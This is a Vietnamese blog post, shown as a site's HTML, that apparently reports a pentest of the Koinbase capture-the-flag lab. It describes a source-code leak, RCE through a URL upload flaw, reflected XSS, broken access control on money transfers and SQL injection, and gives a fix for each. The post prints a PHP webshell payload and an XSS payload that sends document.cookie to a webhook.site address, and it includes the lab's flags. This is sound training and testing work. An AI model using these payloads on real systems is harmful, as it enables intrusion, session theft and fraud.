@@ -1,0 +1,610 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+ 
+
+
+      <title>Report_koinbase - My Blog</title>
+
+  <meta name="description" content="Pentest report koinbase
+Ngày 03 tháng 12 năm 2024 
+Mô tả
+Báo cáo này mô tả chi tiết quá trình và kêt quả kiểm thử ứng dụng Koinbase
+Đối tượng
+
+Koinbase: https://koinbase.cyberjutsu-lab.tech/
+Upload Server: https://upload.koinbase.cyberjutsu-lab.tech/
+
+Công cụ: Burpsuit, VS Code, DevTools
+Mục Lục
+
+
+Tổng quan"><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "My Blog",
+    
+    "url": "https:\/\/tranphongktmm.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/tranphongktmm.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/tranphongktmm.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/tranphongktmm.github.io\/my_blog\/koinbase\/report_koinbase.html",
+          "name": "Report koinbase"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "Report_koinbase",
+  "description" : "Pentest report koinbase Ngày 03 tháng 12 năm 2024 Mô tả Báo cáo này mô tả chi tiết quá trình và kêt quả kiểm thử ứng dụng Koinbase\nĐối tượng Koinbase: https:\/\/koinbase.cyberjutsu-lab.tech\/ Upload Server: https:\/\/upload.koinbase.cyberjutsu-lab.tech\/ Công cụ: Burpsuit, VS Code, DevTools\nMục Lục Tổng quan\n",
+  "inLanguage" : "en",
+  "wordCount":  1664 ,
+  "datePublished" : "2024-12-17T23:53:02\u002b07:00",
+  "dateModified" : "2024-12-17T23:53:02\u002b07:00",
+  "image" : "https:\/\/tranphongktmm.github.io\/img\/avatar-icon.png",
+  "keywords" : [ "" ],
+  "mainEntityOfPage" : "https:\/\/tranphongktmm.github.io\/my_blog\/koinbase\/report_koinbase.html",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/tranphongktmm.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/tranphongktmm.github.io\/img\/avatar-icon.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="Report_koinbase" />
+<meta property="og:description" content="Pentest report koinbase
+Ngày 03 tháng 12 năm 2024 
+Mô tả
+Báo cáo này mô tả chi tiết quá trình và kêt quả kiểm thử ứng dụng Koinbase
+Đối tượng
+
+Koinbase: https://koinbase.cyberjutsu-lab.tech/
+Upload Server: https://upload.koinbase.cyberjutsu-lab.tech/
+
+Công cụ: Burpsuit, VS Code, DevTools
+Mục Lục
+
+
+Tổng quan">
+<meta property="og:image" content="https://tranphongktmm.github.io/img/avatar-icon.png" />
+<meta property="og:url" content="https://tranphongktmm.github.io/my_blog/koinbase/report_koinbase.html" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="My Blog" />
+
+  <meta name="twitter:title" content="Report_koinbase" />
+  <meta name="twitter:description" content="Pentest report koinbase
+Ngày 03 tháng 12 năm 2024 
+Mô tả
+Báo cáo này mô tả chi tiết quá trình và kêt quả kiểm thử ứng dụng Koinbase
+Đối tượng
+
+Koinbase: https://koinbase.cyberjutsu-lab.tech/
+Upload …">
+  <meta name="twitter:image" content="https://tranphongktmm.github.io/img/avatar-icon.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://tranphongktmm.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.139.3">
+  <link rel="alternate" href="https://tranphongktmm.github.io/index.xml" type="application/rss+xml" title="My Blog"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.css" integrity="sha384-3UiQGuEI4TTMaFmGIZumfRPtfKQ3trwQE2JgosJxCnGmQpL/lJdjpcHkaaFwHlcI" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.6.0/css/all.css" integrity="sha384-h/hnnw1Bi4nbpD6kE7nYfCXzovi622sY5WBxww8ARKwpdLj5kUWjRuyiXaD1U2JT" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous"><link rel="stylesheet" href="https://tranphongktmm.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+  <link rel="stylesheet" href="https://tranphongktmm.github.io/css/highlight.min.css" /><link rel="stylesheet" href="https://tranphongktmm.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://tranphongktmm.github.io/">My Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="My Blog" href="https://tranphongktmm.github.io/">
+            <img class="avatar-img" src="https://tranphongktmm.github.io/img/avatar-icon.png" alt="My Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="my_blog-heading">
+              
+                <h1>Report_koinbase</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <h1 id="pentest-report-koinbase"><strong>Pentest report koinbase</strong></h1>
+<h2 id="insngày-03-tháng-12-năm-2024-ins"><strong><!-- raw HTML omitted -->Ngày 03 tháng 12 năm 2024 <!-- raw HTML omitted --></strong></h2>
+<h3 id="mô-tả"><strong>Mô tả</strong></h3>
+<p>Báo cáo này mô tả chi tiết quá trình và kêt quả kiểm thử ứng dụng Koinbase</p>
+<h3 id="đối-tượng"><strong>Đối tượng</strong></h3>
+<ul>
+<li><strong>Koinbase:</strong> <!-- raw HTML omitted --><a href="https://koinbase.cyberjutsu-lab.tech/">https://koinbase.cyberjutsu-lab.tech/</a><!-- raw HTML omitted --></li>
+<li><strong>Upload Server:</strong> <!-- raw HTML omitted --><a href="https://upload.koinbase.cyberjutsu-lab.tech/">https://upload.koinbase.cyberjutsu-lab.tech/</a><!-- raw HTML omitted --></li>
+</ul>
+<p><strong>Công cụ:</strong> Burpsuit, VS Code, DevTools</p>
+<h3 id="mục-lục"><strong>Mục Lục</strong></h3>
+<ol>
+<li>
+<p><strong>Tổng quan</strong></p>
+</li>
+<li>
+<p><strong>Phạm vi</strong></p>
+</li>
+<li>
+<p><strong>Lỗ hổng</strong></p>
+<p><strong>Koi-03-001: Source code disclosure at  <code>https://upload.koinbase.cyberjutsu-lab.tech/</code></strong></p>
+<p><strong>Koi-03-002: Upload link vulnerability at  <code>https://upload.koinbase.cyberjutsu-lab.tech/index.php?url=</code> lead to RCE</strong></p>
+<p><strong>Koi-03-003: HTML Injection lead to Reflected XSS at  <code>https://koinbase.cyberjutsu-lab.tech/?page=1</code></strong></p>
+<p><strong>Koi-03-004:  Broken access control at  <code>https://koinbase.cyberjutsu-lab.tech/api/transaction.php?action=transfer_money</code> lead to anyone can tranfer money from any ID</strong></p>
+<p><strong>Koi-03-005: SQL injection at  <code>https://koinbase.cyberjutsu-lab.tech/api/user.php?action=public_info&amp;id=</code> lead to database dumping</strong></p>
+</li>
+<li>
+<p><strong>Kết luận</strong></p>
+</li>
+</ol>
+<!-- raw HTML omitted -->
+<p><strong>1. Tổng quan</strong></p>
+<p><code>Koinbase là ứng dụng cho phép đăng nhập chuyển tiền giữa các người dùng</code></p>
+<p>Báo cáo này liệt kê các lỗ hổng bảo mật và những vấn đề liên quan được tìm thấy trong quá trình kiểm
+thử ứng dụng Koinbase trên máy tính.</p>
+<p>Mỗi lỗ hổng bảo mật được cung cấp một mã lỗi nhằm mục đích quản lý và theo dõi trong tương lai.
+Các mã lỗi trong báo cáo được đánh số theo thứ tự thời gian tìm ra lỗi.</p>
+<p>Quá trình kiểm thử được thực hiện dưới hình thức blackbox testing.</p>
+<p><strong>2. Phạm vi</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Đối tượng</th>
+          <th>Môi trường</th>
+          <th>Phiên bản</th>
+          <th>Special privileges</th>
+          <th>Source code</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Koinbase</td>
+          <td>Web</td>
+          <td>-</td>
+          <td>-</td>
+          <td>-</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td>Android</td>
+          <td>-</td>
+          <td>-</td>
+          <td>-</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>3. Lỗ hổng</strong></p>
+<p><strong>Koi-03-001: Source code disclosure at  <code>https://upload.koinbase.cyberjutsu-lab.tech/</code></strong></p>
+<p><strong>Description and impact</strong></p>
+<p>Rất có thể do anh dev khi setup server quên không xóa các endpoints và file zip chứa mã nguồn.
+Với mã nguồn này thì những thông tin nhạy cảm như secret key, password, cơ sở dữ liệu, logic
+chương trình, &hellip; sẽ giúp cho kẻ tấn công tiếp tục khai thác sâu vào hệ thông.</p>
+<p><strong>Steps to reproduce</strong></p>
+<p>Khi truy cập vòa đường dẫn <code>https://upload.koinbase.cyberjutsu-lab.tech/robots.txt</code> thì ở file này
+có chứa đường dẫn disallow:</p>
+<p><img src="image.png" alt="alt text">
+<code>Đường dẫn /robots.txt của trang web https://upload.koinbase.cyberjutsu-lab.tech</code></p>
+<p>Sau khi vào đường dẫn disallow, file <code>backup.zip</code> được tải về máy.</p>
+<p>Khi unzip ra thì chứa rất nhiều credentials bao gồm flag chứa trong file zip này.</p>
+<p>Trong file <code>docker-compose.yaml</code> chứa flag đầu tiên:
+<img src="image-2.png" alt="alt text">
+<code>Flag 1: CBJS{do_you_use_a_good_wordlist?}</code></p>
+<p><strong>Recommendation</strong></p>
+<ul>
+<li>Xóa file <code>backup.zip</code> ở <code>https://upload.koinbase.cyberjutsu-lab.tech/backup.zip</code>.</li>
+<li>Đảm bảo kiểm tra và xóa các tệp không cần thiết trước khi deploy ứng dụng lên server.</li>
+</ul>
+<p><strong>Koi-03-002: Upload link vulnerability at  <code>https://upload.koinbase.cyberjutsu-lab.tech/index.php?url=</code> lead to RCE</strong></p>
+<p><strong>Description and impact</strong></p>
+<p>Do web server xử lý các link có nội dung có các file signature của các file trong whitelist mà lại không kiểm tra các extension của
+các file, nên vô tình xử lý các file PHP có signature hợp lệ.
+Kẻ tấn công có thể lợi dụng, để webserver <code>https://upload.koinbase.cyberjutsu-lab.tech/</code> chạy các webshell dẫn tới RCE</p>
+<p><strong>Steps and reproduce</strong></p>
+<p>Ta có thể vào file <code>backup/cdn/src/index.php</code> để đọc mã nguồn.</p>
+<p><img src="image-4.png" alt="alt text">
+<code>Code của trang upload từ dòng 8 đến dòng 35</code></p>
+<p>Tại đây, website nhận vào 1 param <code>url</code> với method <code>GET</code> và kiểm tra xem nó có phải là 1 url hợp lệ.
+Nếu hợp lệ thì tạo ra 1 file bằng cách gọi hàm <code>getExtesion</code> để lấy ra đuôi file của đường dẫn ấy mà
+không qua lớp filter nào nên nếu đuôi file là <code>.php</code> thì file mới trên server tạo ra cũng có đuôi file như thế.</p>
+<p>Sau đó tại dòng 35, server lấy dữ liệu qua url bằng cách gọi hàm <code>file_get_contents</code>. Hàm này có thể lấy được cả code php
+chưa được thực thi . Điểu này dẫn tới server Upload Koinbase có thể lấy mã độc từ server khác về server mình.</p>
+<p><img src="image-6.png" alt="alt text">
+<code>code của trang upload từ dòng 39 đến dòng 58</code></p>
+<p>Hàm <code>file_put_contents</code> giúp ghi dữ liệu lấy được vào file tạo trên server.
+Ở dòng 42, Server thực hiện kiểm tra data ở trong file có phải là file ảnh hay không bằng cách check file signature có là
+1 trong 3 file ở trong whitelist không. Điều này dẫn đến, kẻ tấn công có thể giả mạo bằng các thêm các signature hợp lệ cùng với
+mã độc thì file vẫn sẽ được tải lên server.</p>
+<p>Ta sẽ tạo 1 file <code>payload.php</code> với code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GIF89a
+</span></span><span class="line"><span class="cl">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+</span></span></code></pre></div><p>và tải lên github và đường dẫn mà github trả về cho file webshell là:
+<code>https://github.com/tranphongktmm/Writeup/raw/refs/heads/main/payload.php</code></p>
+<p>Upload file webshell lên server Upload Koinbase:
+<img src="image-7.png" alt="alt text">
+Kiểm tra webshell đã tải lên server có hoạt động:
+<img src="image-8.png" alt="alt text">
+Đọc flag trong file <code>/secret.txt</code> trên server:
+<img src="image-9.png" alt="alt text">
+<code>Flag 2: CBJS{y0u_rce_me_or_you_went_in_another_way?}</code></p>
+<p><strong>Recommendation</strong></p>
+<ul>
+<li>Thêm 1 lớp filter kiểm tra đuôi file của đường link tải lên trùng với file signature</li>
+<li>Validate nội dung file, thêm config ở đường dẫn <code>https://upload.koinbase.cyberjutsu-lab.tech/upload/</code> để server không xử lý code PHP</li>
+</ul>
+<p><strong>Koi-03-003: HTML Injection lead to Reflected XSS at  <code>https://koinbase.cyberjutsu-lab.tech/?page=1</code></strong></p>
+<p><strong>Description and impact</strong></p>
+<p>Do param <code>page</code> được nhận trực tiếp từ đường dẫn browser mà không qua lớp bảo về nào mà hiện lên sang <code>index.php</code>, điều này dẫn tới trang web bị HTML Injection dẫn tới bị XSS. Kẻ tấn công lợi dụng điều này để gửi link payload cho các nạn nhận, cướp đi Cookie giúp hacker truy cập vào tài khoản của các nạn nhân và thực hiện các hành vi trái phép và phá hoại.</p>
+<p><strong>Steps to reproduce</strong></p>
+<p>Tại file <code>index.js</code> trong thư mục <code>backup/koinbase/src/static/js</code>, ta thấy param GET <code>page</code> không được sàng lọc, mà được đưa trực tiếp vào hàm <code>innerHTML</code>:</p>
+<p><img src="image-22.png" alt="alt text">
+<code>Dòng code 16 bị lỗi HTML Injection </code></p>
+<p>Thực hiện khai thác lỗi HTML Injection với payload <code>https://koinbase.cyberjutsu-lab.tech/?page=&lt;h2&gt;hello&lt;/h2&gt;</code>, ta sử dụng devtools để xem rõ hơn. Ta thu được:</p>
+<p><img src="image-23.png" alt="alt text"></p>
+<p><code>&lt;h2&gt;hello&lt;/h2&gt;</code> đã hiển thị trên màn hình và cả ở trong devtools cho thấy trang <code>index.php</code> này bị lỗi HTML Injection.</p>
+<p>Trong đa số trường hợp HTML Injection sẽ dẫn tới XSS. Ta kiểm ra xem có bị XSS với payload <code>https://koinbase.cyberjutsu-lab.tech/?page=&lt;img src=khcodau onerror=&quot;alert(origin)&quot;&gt;</code></p>
+<p><img src="image-24.png" alt="alt text"></p>
+<p>Bây giờ ta có thể sử dụng lỗi này để gửi payload XSS để lấy đi cookie của crush và đăng nhập với danh tính của người này.</p>
+<p>Với payload XSS được gửi đi <code>https://koinbase.cyberjutsu-lab.tech/?page=&lt;img src=khcodau onerror=&quot;fetch(https://webhook.site/267be1fa-4743-48ec-a0a4-1ae001f37f2a?${document.cookie})&quot;</code> và dùng <code>https://webhook.site/</code> để ghi lại giá trị cookie. Ta sẽ thử gửi đi bằng tài khoản của mình:</p>
+<p><strong>Koi-03-004:  Broken access control at  <code>https://koinbase.cyberjutsu-lab.tech/api/transaction.php?action=transfer_money</code> lead to anyone can tranfer money from any ID</strong></p>
+<p><strong>Description and impact</strong>
+Do anh dev đã code ở trang Font End chỉ nhập vào id người nhận <code>receiver_id</code> và số tiền <code>amount</code>. Nhưng gói tin gửi đi bên Burpsuite lại có thêm thêm id của người gửi <code>sender_id</code>,
+lúc này có thể thay đổi id tùy ý, kẻ tấn công có thể dùng tiền của nạn nhân để chuyển cho bất kỳ ai.</p>
+<p><strong>Steps to reproduce</strong></p>
+<p>Sau khi truy cập tới trang chuyển tiền (<code>https://koinbase.cyberjutsu-lab.tech/send_money.php</code>),
+thử chuyển tiền đến 1 người dùng khác và xem các requests gửi đi</p>
+<p><img src="image-10.png" alt="alt text">
+<code>Chuyển tiền đến người nhận có id = 1 và số tiền = 999999999999999999999999</code></p>
+<p>Sau khi gửi sẽ có 1 request trong Burpsuite:
+<img src="image-11.png" alt="alt text"></p>
+<p>Xuất hiện thêm 1 tham số POST <code>sender_id</code> trong khi UI lại không hề cuất hiện nơi để điền.
+Ta tiếp tục sử dụng lỗ hổng <em>Source code disclosure</em> để hiểu rõ hơn.
+Check file <code>/static/js/transaction.js</code>, đã có 1 lần <code>fetch</code> sang <code>/api/user.php?action=detail_info</code> để lấy <code>sender_id</code></p>
+<p><img src="image-13.png" alt="alt text"></p>
+<p>Tại file <code>backup/koinbase/src/api/transaction.php</code></p>
+<p><img src="image-14.png" alt="alt text"></p>
+<p>Tại dòng 8, 9 khi server nhận vào tham số POST <code>sender_id</code> không có bất cứ validation nào nhận
+dạng <code>sender_id</code> này là của chính tài khoản đã đăng nhập, do đó có thể thay đổi tùy ý <code>sender_id</code> và <code>receiver_id</code></p>
+<p>Ta thấy tại <code>https://koinbase.cyberjutsu-lab.tech/?page=1</code>, sử dụng tài khoản admin có <code>id=1</code> để chuyển tiền sang của id của mình với số tiền lớn hơn 1,000,000
+để lấy flag</p>
+<p><img src="image-15.png" alt="alt text"></p>
+<p>Trở lại trang profile <code>https://koinbase.cyberjutsu-lab.tech/profile.php</code> để lấy flag.</p>
+<p><img src="image-16.png" alt="alt text">
+<code>Flag 4: CBJS{master_of_broken_access_control}</code></p>
+<p><strong>Recommedation</strong></p>
+<ul>
+<li>Bỏ param POST <code>sender_id</code> ra khỏi request, và lấy <code>sender_id</code> trực tiếp từ cở sở dữ liệu</li>
+<li>Thêm vào đó các cơ chế xác thực người dùng</li>
+</ul>
+<p><strong>Koi-03-005: SQL injection at  <code>https://koinbase.cyberjutsu-lab.tech/api/user.php?action=public_info&amp;id=</code> lead to databse dumping</strong></p>
+<p><strong>Description and impact</strong></p>
+<p>Web server nhận vào tham số GET <code>id</code> trong request <code>https://koinbase.cyberjutsu-lab.tech/api/user.php?action=public_info&amp;id=</code> không được sàng lọc khi thực hiện truy vấn vào cơ sở dữ liệu, kẻ tấn công lợi dụng điều này để lấy tất cả dữ liệu trong cơ sở dữ liệu</p>
+<p><strong>Steps to reproduce</strong></p>
+<p>Sử dụng lỗ hổng <em>Source code disclosure</em> để hiểu rõ hơn.
+Check file <code>backup/koinbase/src/api/user.php</code></p>
+<p><img src="image-17.png" alt="alt text">
+<code>Code tại file user.php từ dòng 8 đến dòng 10</code></p>
+<p>Ta thấy khi server nhận vào tham số GET <code>id</code> mà không có sự sàng lọc, đưa trực tiếp vào câu truy vấn tại hàm <code>getInfoFromUserId</code>:</p>
+<p><img src="image-18.png" alt="alt text">
+<code>Code tại file database.php từ dòng 42 - 44</code></p>
+<p>Tham số GET <code>id</code> được nối liền với câu truy vấn, điều này dẫn tới bị <em>SQL Injection</em></p>
+<p>Ta sẽ thực hiện, thay đổi tham số GET <code>id</code>, dump ra các table có trong cơ sở dữ liệu.</p>
+<p><img src="image-19.png" alt="alt text"></p>
+<p>Đã dump được 2 table <code>flag,users</code>, tiếp tục đọc các cột có trong table <code>flag</code></p>
+<p><img src="image-20.png" alt="alt text"></p>
+<p>Có 1 cột tên là <code>flag</code>, đọc nội dung của cột <code>flag</code> đó</p>
+<p><img src="image-21.png" alt="alt text">
+<code>Flag 5: CBJS{integer_id_with_sqlinjection}</code></p>
+<p><strong>Recommendation</strong></p>
+<ul>
+<li>Thay đổi câu truy vấn thành dạng <em>Parameterized Query</em> hoặc <em>Stored Procedures</em> để phòng chống SQL Injection</li>
+<li>Đưa tham số GET <code>id</code> vào dấu  <code>'</code> hoặc <code>&quot;</code> và validate <code>id</code></li>
+</ul>
+<p><strong>4. Kết luận</strong></p>
+<p>Thông qua bản báo cáo này, mình đã thành công tìm ra 5 lỗi bảo mật khác nhau nhằm đánh giá sát sao và đưa ra một cái nhìn dễ hiểu và trực quan nhất nhằm giúp người đọc có thể nhìn thấy và đánh giá những rủi ro trong hệ thống Koinbase.</p>
+<p>Từ những lỗi tìm được, mình nhận thấy các giá trị đầu vào từ phía người dùng gửi tới server không thường được validate cẩn thận trước khi xử lý, dẫn đến những rủi ro như hiện tại và có thể xảy ra trong tương lai. Những rủi ro trên có thể gây thiệt hại cho cả 2 phía: server và người dùng nói chung.</p>
+<p>Hy vọng rằng những phát hiện và giải pháp được đề xuất trong báo cáo này sẽ đóng góp vào việc nâng cao an toàn và giảm thiểu rủi ro cho hệ thống trong tương lai.</p>
+
+
+        
+
+        
+            <hr/>
+            <section id="social-share">
+              <div class="list-inline footer-links">
+                
+
+<div class="share-box" aria-hidden="true">
+    <ul class="share">
+      
+      <li>
+        <a href="//twitter.com/share?url=https%3a%2f%2ftranphongktmm.github.io%2fmy_blog%2fkoinbase%2freport_koinbase.html&amp;text=Report_koinbase&amp;via=" target="_blank" title="Share on Twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2ftranphongktmm.github.io%2fmy_blog%2fkoinbase%2freport_koinbase.html" target="_blank" title="Share on Facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//reddit.com/submit?url=https%3a%2f%2ftranphongktmm.github.io%2fmy_blog%2fkoinbase%2freport_koinbase.html&amp;title=Report_koinbase" target="_blank" title="Share on Reddit">
+          <i class="fab fa-reddit"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2ftranphongktmm.github.io%2fmy_blog%2fkoinbase%2freport_koinbase.html&amp;title=Report_koinbase" target="_blank" title="Share on LinkedIn">
+          <i class="fab fa-linkedin"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2ftranphongktmm.github.io%2fmy_blog%2fkoinbase%2freport_koinbase.html&amp;title=Report_koinbase" target="_blank" title="Share on StumbleUpon">
+          <i class="fab fa-stumbleupon"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2ftranphongktmm.github.io%2fmy_blog%2fkoinbase%2freport_koinbase.html&amp;description=Report_koinbase" target="_blank" title="Share on Pinterest">
+          <i class="fab fa-pinterest"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+  
+
+              </div>
+            </section>
+        
+
+        
+          
+
+          
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+          
+        </ul>
+      
+
+
+      
+      
+      
+      
+      
+        
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2024
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://tranphongktmm.github.io/">My Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.139.3</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://tranphongktmm.github.io/js/main.js"></script>
+<script src="https://tranphongktmm.github.io/js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://tranphongktmm.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
